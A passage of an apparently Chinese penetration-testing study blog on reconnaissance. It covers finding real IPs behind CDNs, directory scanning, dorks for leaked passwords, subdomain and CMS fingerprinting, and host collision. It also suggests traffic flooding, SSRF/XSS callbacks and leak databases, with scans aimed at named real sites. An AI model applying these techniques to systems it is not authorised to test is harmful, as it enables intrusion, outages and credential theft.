title="长期关注"></a>长期关注</h3><p>在长期渗透的时候，设置程序每天访问网站，可能有新的发现。</p><p>每天零点 或者业务需求增大 它会换ip 换服务器的。</p><h3 id="流量攻击"><a href="#流量攻击" class="headerlink" title="流量攻击"></a>流量攻击</h3><p>发包机可以一下子发送很大的流量。</p><p>这个方法是很笨，但是在特定的目标下渗透，建议采用。</p><p>cdn除了能隐藏ip，可能还考虑到分配流量， </p><p>不设防的cdn 量大就会挂，高防cdn 要大流量访问。</p><p>经受不住大流量冲击的时候可能会显示真实ip。</p><p>站长-&gt;业务不正常-&gt;cdn不使用-&gt;更换服务器。</p><h3 id="被动获取"><a href="#被动获取" class="headerlink" title="被动获取"></a>被动获取</h3><p>被动获取就是让服务器或网站主动连接我们的服务器，从而获取服务器的真实IP</p><p>如果网站有编辑器可以填写远程url图片，即可获取真实IP</p><p>如果存在ssrf漏洞 或者xss 让服务器主动连接我们的服务器 均可获取真实IP。</p><h3 id="扫全网获取真实IP"><a href="#扫全网获取真实IP" class="headerlink" title="扫全网获取真实IP"></a>扫全网获取真实IP</h3><p><a href="https://github.com/superfish9/hackcdn">https://github.com/superfish9/hackcdn</a></p><p><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a></p>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 部署CDN网站找真实ip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息搜集</title>
      <link href="/2021/07/21/60-zhi-day17/"/>
      <url>/2021/07/21/60-zhi-day17/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><span id="more"></span><h2 id="扫描敏感目录-文件"><a href="#扫描敏感目录-文件" class="headerlink" title="扫描敏感目录/文件"></a>扫描敏感目录/文件</h2><p>扫描敏感目录需要强大的字典，需要平时积累，拥有强大的字典能够更高效地找出网站的管理后台。</p><p>敏感文件常见的如.git文件泄露，.svn文件泄露，phpinfo泄露等，这一步一般交给各类扫描器就可以了，将目标站点输入到域名中，选择对应字典类型，就可以开始扫描了，十分方便。</p><h3 id="御剑"><a href="#御剑" class="headerlink" title="御剑"></a>御剑</h3><p><img src="/2021/07/21/60-zhi-day17/image-20210722103118289.png" alt="image-20210722103118289"></p><h3 id="7kbscan"><a href="#7kbscan" class="headerlink" title="7kbscan"></a>7kbscan</h3><p><img src="/2021/07/21/60-zhi-day17/image-20210722103240335.png" alt="image-20210722103240335"></p><h3 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h3><p>在dirsearch目录下运行命令</p><pre class="line-numbers language-none"><code class="language-none">python3 dirsearch.py -u http://m.scabjd.com/ -e * <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/07/21/60-zhi-day17/image-20210722115922427.png" alt="image-20210722115922427"></p><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install gobuster gobuster dir -u https://www.servyou.com.cn/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 50dir -u 网址 w字典 -x 指定后缀 -t 线程数量dir -u https://www.servyou.com.cn/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x "php,html,rar,zip" -d --wildcard -o servyou.log | grep ^"3402"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/07/21/60-zhi-day17/image-20210722120131108.png" alt="image-20210722120131108"></p><h3 id="网站文件"><a href="#网站文件" class="headerlink" title="网站文件"></a>网站文件</h3><p><a href="https://www.secpulse.com/archives/55286.html">常见Web源码泄露总结 - SecPulse.COM | 安全脉搏</a></p><p>以下是我们的目标：</p><ul><li> robots.txt</li><li>crossdomin.xml</li><li>sitemap.xml</li><li>后台目录</li><li>网站安装包</li><li>网站上传目录</li><li>mysql管理页面</li><li>phpinfo</li><li>网站文本编辑器</li><li>测试文件</li><li>网站备份文件(.rar、zip、.7z、.tar.gz、.bak)</li><li> DS_Store 文件</li><li>vim编辑器备份文件(.swp)</li><li> WEB—INF/web.xml文件</li><li>.git</li><li> .svn</li></ul><h2 id="扫描网页备份"><a href="#扫描网页备份" class="headerlink" title="扫描网页备份"></a>扫描网页备份</h2><p>如：</p><ul><li>config.php</li><li>config.php~</li><li>config.php.bak</li><li>config.php.swp</li><li>config.php.rar</li><li>conig.php.tar.gz</li></ul><h2 id="网站头信息搜集"><a href="#网站头信息搜集" class="headerlink" title="网站头信息搜集"></a>网站头信息搜集</h2><p>中间件：web服务【Web Servers】 apache iis7 iis7.5 iis8 nginx WebLogic tomcat</p><p>网站组件：js组件jquery、vue  页面的布局bootstrap</p><h3 id="在线网站"><a href="#在线网站" class="headerlink" title="在线网站"></a>在线网站</h3><p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722121022888.png" alt="image-20210722121022888"></p><h3 id="火狐插件Wappalyzer"><a href="#火狐插件Wappalyzer" class="headerlink" title="火狐插件Wappalyzer"></a>火狐插件Wappalyzer</h3><p><img src="/2021/07/21/60-zhi-day17/image-20210722121802631.png" alt="image-20210722121802631"></p><h2 id="敏感文件搜索"><a href="#敏感文件搜索" class="headerlink" title="敏感文件搜索"></a>敏感文件搜索</h2><h3 id="GitHub搜索"><a href="#GitHub搜索" class="headerlink" title="GitHub搜索"></a>GitHub搜索</h3><p>in:name test #仓库标题搜索含有关键字test</p><p>in:descripton test #仓库描述搜索含有关键字</p><p>in:readme test #Readme文件搜素含有关键字</p><p>搜索某些系统的密码</p><p><a href="https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code">https://github.com/search?q=smtp+58.com+password+3306&amp;type=Code</a></p><p>github 关键词监控</p><p><a href="https://www.codercto.com/a/46640.html">https://www.codercto.com/a/46640.html</a></p><p>谷歌搜索</p><p>site:Github.com sa password</p><p>site:Github.com root password</p><p>site:Github.com User ID=’sa’;Password</p><p>site:Github.com inurl:sql</p><p>SVN 信息收集</p><p>site:Github.com svn</p><p>site:Github.com svn username</p><p>site:Github.com svn password</p><p>site:Github.com svn username password</p><p>综合信息收集</p><p>site:Github.com password</p><p>site:Github.com ftp ftppassword</p><p>site:Github.com 密码</p><p>site:Github.com 内部</p><p>几篇关于GitHub搜索的文章</p><p><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">https://blog.csdn.net/qq_36119192/article/details/99690742</a></p><p><a href="http://www.361way.com/github-hack/6284.html">http://www.361way.com/github-hack/6284.html</a></p><p><a href="https://docs.github.com/cn/github/searching-for-information-on-github/searching-code">https://docs.github.com/cn/github/searching-for-information-on-github/searching-code</a></p><p><a href="https://github.com/search?q=smtp+bilibili.com&amp;type=code">https://github.com/search?q=smtp+bilibili.com&amp;type=code</a></p><h3 id="Googlehacking"><a href="#Googlehacking" class="headerlink" title="Googlehacking"></a>Googlehacking</h3><p>见day16</p><h3 id="wooyun漏洞库"><a href="#wooyun漏洞库" class="headerlink" title="wooyun漏洞库"></a>wooyun漏洞库</h3><p><a href="https://wooyun.website/">https://wooyun.website/</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722122633303.png" alt="image-20210722122633303"></p><h3 id="网盘搜索"><a href="#网盘搜索" class="headerlink" title="网盘搜索"></a>网盘搜索</h3><p>凌云搜索 </p><p> <a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722122735429.png" alt="image-20210722122735429"></p><p>盘多多：</p><p><a href="https://www.panduoduo.org/">https://www.panduoduo.org/</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722123114947.png" alt="image-20210722123114947"></p><p>盘搜搜：</p><p><a href="http://www.pansoso.com/">http://www.pansoso.com/</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722122907126.png" alt="image-20210722122907126"></p><p>盘搜：</p><p><a href="http://www.pansou.com/">http://www.pansou.com/</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722122912939.png" alt="image-20210722122912939"></p><h3 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h3><p>名字/常用id/邮箱/密码/电话 登录 网盘 网站 邮箱 找敏感信息</p><h3 id="网站注册信息"><a href="#网站注册信息" class="headerlink" title="网站注册信息"></a>网站注册信息</h3><p>查询网站注册信息</p><p><a href="http://www.reg007.com/">http://www.reg007.com</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722123414499.png" alt="image-20210722123414499"></p><h3 id="js敏感信息"><a href="#js敏感信息" class="headerlink" title="js敏感信息"></a>js敏感信息</h3><p>网站的url连接写到js里面</p><p>js的api接口 里面包含用户信息 比如 账号和密码</p><h4 id="jsfinder"><a href="#jsfinder" class="headerlink" title="jsfinder"></a>jsfinder</h4><p>python3 JSFinder.py -u <a href="http://www.mi.com/">http://www.mi.com</a></p><p>python3 JSFinder.py -u <a href="http://www.mi.com/">http://www.mi.com</a> -d</p><p>python3 JSFinder.py -u <a href="http://www.mi.com/">http://www.mi.com</a> -d -ou mi_url.txt -os mi_subdomain.txt</p><p>当你想获取更多信息的时候，可以使用-d进行深度爬取来获得更多内容，并使用命令 -ou, -os来指定URL和子域名所保存的文件名</p><p>批量指定URL和JS链接来获取里面的URL：</p><p>指定URL：</p><p>python JSFinder.py -f text.txt </p><p>指定JS：</p><p>python JSFinder.py -f text.txt -j</p><p><img src="/2021/07/21/60-zhi-day17/image-20210722125020070.png" alt="image-20210722125020070"></p><h2 id="cms识别"><a href="#cms识别" class="headerlink" title="cms识别"></a>cms识别</h2><p>收集好网站信息之后，应该对网站进行指纹识别，通过识别指纹，确定目标的cms及版本，方便制定下一步的测试计划，可以用公开的poc或自己累积的对应手法等进行正式的渗透测试。</p><h3 id="云悉"><a href="#云悉" class="headerlink" title="云悉"></a>云悉</h3><p><a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722125608346.png" alt="image-20210722125608346"></p><h3 id="潮汐识别"><a href="#潮汐识别" class="headerlink" title="潮汐识别"></a>潮汐识别</h3><p><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722125638771.png" alt="image-20210722125638771"></p><h3 id="CMS指纹识别"><a href="#CMS指纹识别" class="headerlink" title="CMS指纹识别"></a>CMS指纹识别</h3><p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722125757867.png" alt="image-20210722125757867"></p><p><a href="https://github.com/search?q=cms%E8%AF%86%E5%88%AB">https://github.com/search?q=cms识别</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722125847365.png" alt="image-20210722125847365"></p><h3 id="whatweb-cms"><a href="#whatweb-cms" class="headerlink" title="whatweb cms"></a>whatweb cms</h3><p><img src="/2021/07/21/60-zhi-day17/image-20210722130440561.png" alt="image-20210722130440561"></p><h3 id="御剑cms"><a href="#御剑cms" class="headerlink" title="御剑cms"></a>御剑cms</h3><p><img src="/2021/07/21/60-zhi-day17/image-20210722130509348.png" alt="image-20210722130509348"></p><h2 id="非常规操作"><a href="#非常规操作" class="headerlink" title="非常规操作"></a>非常规操作</h2><p>1、如果找到了目标的一处资产，但是对目标其他资产的收集无处下手时，可以查看一下该站点的body里是否有目标的特征，然后利用网络空间搜索引擎（如fofa等）对该特征进行搜索，如：body=”XX公司”或body=”baidu”等。</p><p>该方式一般适用于特征明显，资产数量较多的目标，并且很多时候效果拔群。</p><p>2、当通过上述方式的找到test.com的特征后，再进行body的搜索，然后再搜索到test.com的时候，此时fofa上显示的ip大概率为test.com的真实IP。</p><p>3、如果需要对政府网站作为目标，那么在批量获取网站首页的时候，可以用上</p><p><a href="http://114.55.181.28/databaseInfo/index%E4%B9%8B%E5%90%8E%E5%8F%AF%E4%BB%A5%E7%BB%93%E5%90%88%E4%B8%8A%E4%B8%80%E6%AD%A5%E7%9A%84%E6%96%B9%E6%B3%95%E8%BF%9B%E8%A1%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E3%80%82">http://114.55.181.28/databaseInfo/index之后可以结合上一步的方法进行进一步的信息收集。</a></p><h2 id="SSL-TLS证书查询"><a href="#SSL-TLS证书查询" class="headerlink" title="SSL/TLS证书查询"></a>SSL/TLS证书查询</h2><p>SSL/TLS证书通常包含域名、子域名和邮件地址等信息，结合证书中的信息，可以更快速地定位到目标资产，获取到更多目标资产的相关信息。</p><h3 id="在线网站-1"><a href="#在线网站-1" class="headerlink" title="在线网站"></a>在线网站</h3><p><a href="https://myssl.com/">https://myssl.com/</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722130930339.png" alt="image-20210722130930339"></p><p><a href="https://crt.sh/">https://crt.sh</a> 挂梯子</p><p><img src="/2021/07/21/60-zhi-day17/image-20210722131140578.png" alt="image-20210722131140578"></p><p><a href="https://censys.io/">https://censys.io</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722131015908.png" alt="image-20210722131015908"></p><p><a href="https://developers.facebook.com/tools/ct/">https://developers.facebook.com/tools/ct/</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722131105035.png" alt="image-20210722131105035"></p><p><a href="https://google.com/transparencyreport/https/ct/">https://google.com/transparencyreport/https/ct/</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722131122353.png" alt="image-20210722131122353"></p><p>SSL证书搜索引擎：</p><p><a href="https://certdb.com/domain/github.com">https://certdb.com/domain/github.com</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722131212212.png" alt="image-20210722131212212"></p><p><a href="https://crt.sh/?Identity=%25.moonsec.com">https://crt.sh/?Identity=%.moonsec.com</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722131228095.png" alt="image-20210722131228095"></p><h2 id="查找厂商ip段"><a href="#查找厂商ip段" class="headerlink" title="查找厂商ip段"></a>查找厂商ip段</h2><p><img src="/2021/07/21/60-zhi-day17/image-20210722131325462.png" alt="image-20210722131325462"></p><h2 id="移动资产搜集"><a href="#移动资产搜集" class="headerlink" title="移动资产搜集"></a>移动资产搜集</h2><h3 id="微信小程序-支付宝小程序"><a href="#微信小程序-支付宝小程序" class="headerlink" title="微信小程序/支付宝小程序"></a>微信小程序/支付宝小程序</h3><p>现在很多企业都有小程序，可以关注企业的微信公众号或者支付宝小程序，或关注运营相关人员，查看朋友圈，获取小程序。</p><p><a href="https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E6%8B%BC%E5%A4%9A%E5%A4%9A">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=拼多多</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722131412634.png" alt="image-20210722131412634"></p><h3 id="app软件搜索"><a href="#app软件搜索" class="headerlink" title="app软件搜索"></a>app软件搜索</h3><p><a href="https://www.qimai.cn/">https://www.qimai.cn/</a></p><p><img src="/2021/07/21/60-zhi-day17/image-20210722131522047.png" alt="image-20210722131522047"></p><h2 id="社交信息搜索"><a href="#社交信息搜索" class="headerlink" title="社交信息搜索"></a>社交信息搜索</h2><p>QQ群 QQ手机号</p><p>微信群 </p><p>领英</p><p><a href="https://www.linkedin.com/">https://www.linkedin.com/</a></p><p>脉脉招聘</p><p>boss招聘</p><h2 id="防护软件搜集"><a href="#防护软件搜集" class="headerlink" title="防护软件搜集"></a>防护软件搜集</h2><p>安全防护 云waf、硬件waf、主机防护软件、软waf</p>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息搜集</title>
      <link href="/2021/07/20/60-zhi-day16/"/>
      <url>/2021/07/20/60-zhi-day16/</url>
      
        <content type="html"><![CDATA[<h1 id="信息搜集篇"><a href="#信息搜集篇" class="headerlink" title="信息搜集篇"></a>信息搜集篇</h1><span id="more"></span><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><blockquote><p><strong>渗透的本质是信息收集</strong></p><p>信息收集也叫做资产收集</p><p>信息收集是渗透测试的前期主要工作，是非常重要的环节，收集足够多的信息才能方便接下来的测试。</p><p>信息收集主要是收集网站的域名信息、子域名信息、目标网站信息、目标网站真实IP、敏感/目录文件、开放端口和中间件信息等等。通过各种渠道和手段尽可能收集到多的关于这个站点的信息，有助于我们更多的去找到渗透点，突破口。</p></blockquote><h2 id="信息搜集分类"><a href="#信息搜集分类" class="headerlink" title="信息搜集分类"></a>信息搜集分类</h2><ul><li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li><li>网站指纹识别（包括，cms，cdn，证书等） dns记录</li><li> whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li><li>子域名收集，旁站，C段等</li><li>google hacking针对化搜索，word/电子表格/pdf文件，中间件版本，弱口令扫描等</li><li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li><li>传输协议，通用漏洞，exp，github源码等</li></ul><h2 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h2><ol><li><p>whois查询</p><p>域名在注册的时候 需要填入个人或者企业信息 如果没有设置隐藏属性可以查询出来 </p><p>通过备案号 查询个人或者企业信息 也可以whois反查注册人 邮箱 电话 机构 反查更多得域名和需要得信息。</p></li><li><p>收集子域名</p><p>域名分为根域名和子域名</p><p>moonsec.com 根域名 顶级域名</p><p><a href="http://www.moonsec.com子域名/">www.moonsec.com子域名</a> 也叫二级域名</p><p><a href="http://www.wiki.moonsec.com/">www.wiki.moonsec.com</a>  子域名 也叫三级域名 四级如此类推</p></li><li><p>端口扫描</p><p>服务器需要开放服务，就必须开启端口，常见的端口是tcp 和udp两种类型 </p><p>范围 0-65535 通过扫得到的端口，访问服务 规划下一步渗透。</p></li><li><p>查找真实ip</p><p>企业的网站，为了提高访问速度，或者避免黑客攻击，用了cdn服务，用了cdn之后真实服务器ip会被隐藏。</p></li><li><p>探测旁站及C段</p><p>旁站:一个服务器上有多个网站 通过ip查询服务器上的网站</p><p>c段:查找同一个段 服务器上的网站。可以找到同样网站的类型和服务器，也可以获取同段服务器进行下一步渗透。</p></li><li><p>网络空间搜索引擎</p><p>通过这些引擎查找网站或者服务器的信息，进行下一步渗透。</p></li><li><p>扫描敏感目录/文件</p><p>通过扫描目录和文件，大致了解网站的结构，获取突破点，比如后台，文件备份，上传点。</p></li><li><p>指纹识别</p><p>获取网站的版本，属于那些cms管理系统，查找漏洞exp，下载cms进行代码审计。</p></li></ol><h2 id="在线whois查询"><a href="#在线whois查询" class="headerlink" title="在线whois查询"></a>在线whois查询</h2><p>通过whois来对域名信息进行查询，可以查到注册商、注册人、邮箱、DNS解析服务器、注册人联系电话等。</p><p>因为有些网站信息查得到，有些网站信息查不到，所以推荐以下信息比较全的查询网站，直接输入目标站点即可查询到相关信息。</p><blockquote><p>站长之家域名WHOIS信息查询地址 <a href="http://whois.chinaz.com/">http://whois.chinaz.com</a> </p><p>爱站网域名WHOIS信息查询地址 <a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>腾讯云域名WHOIS信息查询地址 <a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p><p>美橙互联域名WHOIS信息查询地址 <a href="https://whois.cndns.com/">https://whois.cndns.com/</a></p><p>爱名网域名WHOIS信息查询地址 <a href="https://www.22.cn/domain/">https://www.22.cn/domain/</a></p><p>易名网域名WHOIS信息查询地址 <a href="https://whois.ename.net/">https://whois.ename.net/</a></p><p>中国万网域名WHOIS信息查询地址 <a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></p><p>西部数码域名WHOIS信息查询地址 <a href="https://whois.west.cn/">https://whois.west.cn/</a></p><p>新网域名WHOIS信息查询地址 <a href="http://whois.xinnet.com/domain/whois/index.jsp">http://whois.xinnet.com/domain/whois/index.jsp</a></p><p>纳网域名WHOIS信息查询地址 <a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a></p><p>中资源域名WHOIS信息查询地址 <a href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a></p><p>三五互联域名WHOIS信息查询地址 <a href="https://cp.35.com/chinese/whois.php">https://cp.35.com/chinese/whois.php</a></p><p>新网互联域名WHOIS信息查询地址 <a href="http://www.dns.com.cn/show/domain/whois/index.do">http://www.dns.com.cn/show/domain/whois/index.do</a></p><p>国外WHOIS信息查询地址 <a href="https://who.is/">https://who.is/</a></p></blockquote><h2 id="在线查询网站备案"><a href="#在线查询网站备案" class="headerlink" title="在线查询网站备案"></a>在线查询网站备案</h2><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案。</p><p>如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等），推荐以下网站查询</p><ul><li>天眼查 <a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li><li>ICP备案查询网<a href="http://www.beianbeian.com/">http://www.beianbeian.com/</a></li><li>爱站备案查询<a href="https://icp.aizhan.com/">https://icp.aizhan.com/</a></li><li>域名助手备案信息查询 <a href="http://cha.fute.com/index">http://cha.fute.com/index</a></li></ul><h2 id="搜集子域名"><a href="#搜集子域名" class="headerlink" title="搜集子域名"></a>搜集子域名</h2><h3 id="子域名的作用"><a href="#子域名的作用" class="headerlink" title="子域名的作用"></a>子域名的作用</h3><p>搜集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。</p><h3 id="常用方式"><a href="#常用方式" class="headerlink" title="常用方式"></a>常用方式</h3><p>子域名中的常见资产类型一般包括办公系统，邮箱系统，论坛，商城，其他管理系统，网站管理后台也有可能出现子域名中。</p><p>首先找到目标站点，在<strong>官网</strong>中可能会找到相关资产（多为办公系统，邮箱系统等），关注一下<strong>页面底部</strong>，也许有管理后台等收获。</p><p>查找目标域名信息方法：</p><ul><li><p> FOFA title=”公司名称”</p></li><li><p>百度 intitle=公司名称</p></li><li><p>Google intitle=公司名称 </p></li><li><p>站长之家，直接搜索名称或者网站域名即可查看相关信息：</p><p><a href="http://tool.chinaz.com/">http://tool.chinaz.com/</a></p></li><li><p>钟馗之眼 site=域名即可</p><p><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p></li></ul><p>找到官网后，再收集子域名</p><h2 id="域名的类型"><a href="#域名的类型" class="headerlink" title="域名的类型"></a>域名的类型</h2><p>A记录、别名记录(CNAME)、MX记录、TXT记录、NS记录</p><h3 id="A-Address-记录"><a href="#A-Address-记录" class="headerlink" title="A(Address)记录"></a>A(Address)记录</h3><p>是用来指定主机名（或域名）对应的IP地址记录。</p><p>用户可以将该域名下的网站服务器指向到自己的web server上。同时也可以设置您域名的二级域名。</p><h3 id="别名-CNAME-记录"><a href="#别名-CNAME-记录" class="headerlink" title="别名(CNAME)记录"></a>别名(CNAME)记录</h3><p>也被称为规范名字。</p><p>这种记录允许您将多个名字映射到同一台计算机。通常用于同时提供WWW和MAIL服务的计算机。</p><p>例如，有一台计算机名为“host.mydomain.com”（A记录）。它同时提供WWW和MAIL服务，为了便于用户访问服务。可以为该计算机设置两个别名（CNAME）：WWW和MAIL。这两个别名的全称就是“<a href="http://www.mydomain.com”和“mail.mydomain.com”.实际上他们都指向“host.mydomain.com”./">www.mydomain.com”和“mail.mydomain.com”。实际上他们都指向“host.mydomain.com”。</a></p><h4 id="如何检测CNAME记录"><a href="#如何检测CNAME记录" class="headerlink" title="如何检测CNAME记录"></a>如何检测CNAME记录</h4><ol><li>进入命令状态；（开始菜单 - 运行 - CMD[回车]）；</li><li>输入命令” nslookup -q=cname 这里填写对应的域名或二级域名”，查看返回的结果与设置的是否一致即可。 </li></ol><h3 id="MX-Mail-Exchanger-记录"><a href="#MX-Mail-Exchanger-记录" class="headerlink" title="MX(Mail Exchanger)记录"></a>MX(Mail Exchanger)记录</h3><p>是邮件交换记录，它指向一个邮件服务器。</p><p>用于电子邮件系统发邮件时根据 收信人的地址后缀来定位邮件服务器。</p><p>例如，当Internet上的某用户要发一封信给 <a href="mailto:user@mydomain.com">user@mydomain.com</a> 时，该用户的邮件系统通过DNS查找mydomain.com这个域名的MX记录，如果MX记录存在， 用户计算机就将邮件发送到MX记录所指定的邮件服务器上。</p><h3 id="TXT记录"><a href="#TXT记录" class="headerlink" title="TXT记录"></a>TXT记录</h3><p>TXT记录一般指为某个主机名或域名设置的说明，如：</p><ul><li>admin IN TXT “jack, mobile:13800138000”；</li><li>mail IN TXT “邮件主机, 存放在xxx ,管理人：AAA”，Jim IN TXT “contact: <a href="mailto:abc@mailserver.com">abc@mailserver.com</a>“</li></ul><p>也就是您可以设置 TXT ，以便使别人联系到您。</p><h4 id="如何检测TXT记录"><a href="#如何检测TXT记录" class="headerlink" title="如何检测TXT记录"></a>如何检测TXT记录</h4><ol><li>进入命令状态；（开始菜单 - 运行 - CMD[回车]）；</li><li>输入命令” nslookup -q=txt 这里填写对应的域名或二级域名”，查看返回的结果与设置的是否一致即可。 </li></ol><h3 id="NS-Name-Server-记录"><a href="#NS-Name-Server-记录" class="headerlink" title="NS(Name Server)记录"></a>NS(Name Server)记录</h3><p>是一种域名服务器记录。</p><p>用来明确当前你的域名是由哪个DNS服务器来进行解析的。</p><h2 id="子域名在线查询"><a href="#子域名在线查询" class="headerlink" title="子域名在线查询"></a>子域名在线查询</h2><p><a href="https://phpinfo.me/domain/">https://phpinfo.me/domain/</a></p><p><img src="/2021/07/20/60-zhi-day16/image-20210720205320307.png" alt="image-20210720205320307"></p><p><a href="https://www.t1h2ua.cn/tools/">https://www.t1h2ua.cn/tools/</a></p><p><img src="/2021/07/20/60-zhi-day16/image-20210720205421324.png" alt="image-20210720205421324"></p><p><a href="https://site.ip138.com/moonsec.com/domain.htm">https://site.ip138.com/moonsec.com/domain.htm</a></p><p><img src="/2021/07/20/60-zhi-day16/image-20210720205627604.png" alt="image-20210720205627604"></p><p><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><p>挂梯子</p><p><img src="/2021/07/20/60-zhi-day16/image-20210720205835428.png" alt="image-20210720205835428"></p><p><a href="https://fofa.so/">https://fofa.so/</a></p><p><img src="/2021/07/20/60-zhi-day16/image-20210720205947152.png" alt="image-20210720205947152"></p><p><a href="https://hackertarget.com/find-dns-host-records/">https://hackertarget.com/find-dns-host-records/</a></p><p>通过该方法查询子域名可以得到一个目标大概的ip段，接下来可以通过ip来收集信息。</p><p><img src="/2021/07/20/60-zhi-day16/image-20210720210059558.png" alt="image-20210720210059558"></p><h2 id="子域名挖掘工具"><a href="#子域名挖掘工具" class="headerlink" title="子域名挖掘工具"></a>子域名挖掘工具</h2><h3 id="layer子域名挖掘"><a href="#layer子域名挖掘" class="headerlink" title="layer子域名挖掘"></a>layer子域名挖掘</h3><p><img src="/2021/07/20/60-zhi-day16/image-20210721093529601.png" alt="image-20210721093529601"></p><h3 id="SubDomainBute"><a href="#SubDomainBute" class="headerlink" title="SubDomainBute"></a>SubDomainBute</h3><p>12server中安装python环境</p><pre class="line-numbers language-none"><code class="language-none">pip install aiodns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/07/20/60-zhi-day16/image-20210721104820853.png" alt="image-20210721104820853"></p><p>运行命令</p><p>进入工具文件夹 cd</p><p>subDomainsBrute.py freebuf.com  </p><p>subDomainsBrute.py  freebuf.com –full -o freebuf2.txt</p><p><img src="/2021/07/20/60-zhi-day16/image-20210721104929931.png" alt="image-20210721104929931"></p><h2 id="隐藏域名hosts碰撞"><a href="#隐藏域名hosts碰撞" class="headerlink" title="隐藏域名hosts碰撞"></a>隐藏域名hosts碰撞</h2><blockquote><p>很多时候访问目标资产IP响应多为：401、403、404、500，但是用域名请求却能返回正常的业务系统（禁止IP直接访问），因为这大多数都是需要绑定host才能正常请求访问的 （目前互联网公司基本的做法）（域名删除了A记录，但是反代的配置未更新），那么我们就可以通过收集到的目标的 域名 和 目标资产 的IP段组合起来，以 IP段+域名 的形式进行捆绑碰撞，就能发现很多有意思的东西。</p></blockquote><p>在发送http请求的时候，对域名和IP列表进行配对，然后遍历发送请求 （就相当于修改了本地的hosts文件一样），并把相应的title和响应包大小拿回 来做对比，即可快速发现一些隐蔽的资产。</p><p>进行hosts碰撞需要目标的域名和目标的相关IP作为字典</p><p>目标域名历史解析IP：</p><p><a href="https://site.ip138.com/">https://site.ip138.com/</a></p><p><img src="/2021/07/20/60-zhi-day16/image-20210721110314191.png" alt="image-20210721110314191"></p><p><a href="https://ipchaxun.com/">https://ipchaxun.com/</a></p><p><img src="/2021/07/20/60-zhi-day16/image-20210721110306959.png" alt="image-20210721110306959"></p><p>ip正则：</p><p><a href="https://www.aicesu.cn/reg/">https://www.aicesu.cn/reg/</a></p><p><img src="/2021/07/20/60-zhi-day16/image-20210721110322145.png" alt="image-20210721110322145"></p><h3 id="工具host-scan-master"><a href="#工具host-scan-master" class="headerlink" title="工具host-scan-master"></a>工具host-scan-master</h3><p><img src="/2021/07/20/60-zhi-day16/image-20210727125808505.png" alt="image-20210727125808505"></p><p>host填写域名</p><p>ip填写ip</p><p>host_ok返回正确匹配的值</p><p><img src="/2021/07/20/60-zhi-day16/image-20210727125917590.png" alt="image-20210727125917590"></p><p>我们之后再host_ok查看即可</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" 